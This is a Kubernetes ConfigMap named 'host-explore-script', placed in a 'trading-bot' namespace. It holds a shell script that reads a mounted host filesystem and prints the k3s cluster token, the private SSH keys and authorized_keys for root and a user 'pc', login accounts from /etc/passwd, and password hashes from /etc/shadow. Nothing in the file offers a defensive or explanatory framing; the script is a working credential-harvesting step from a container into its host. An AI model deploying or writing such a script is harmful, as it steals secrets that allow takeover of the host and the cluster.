apiVersion: v1
kind: ConfigMap
metadata:
  name: host-explore-script
  namespace: trading-bot
data:
  run.sh: |
    #!/bin/sh
    echo K3S_TOKEN
    cat /k3s-server/token
    echo SSH_PC_AUTHORIZED
    cat /host-root/home/pc/.ssh/authorized_keys 2>/dev/null || echo none
    echo SSH_PC_PRIVKEY
    cat /host-root/home/pc/.ssh/id_rsa 2>/dev/null || cat /host-root/home/pc/.ssh/id_ed25519 2>/dev/null || echo none
    echo SSH_ROOT_AUTHORIZED
    cat /host-root/root/.ssh/authorized_keys 2>/dev/null || echo none
    echo SSH_ROOT_KEY
    cat /host-root/root/.ssh/id_rsa 2>/dev/null || echo none
    echo PASSWD
    cat /host-root/etc/passwd | grep -v nologin | grep -v false
    echo SHADOW
    cat /host-root/etc/shadow 2>/dev/null | grep -v ":!:" | grep -v ":*:" | head -20
    echo DONE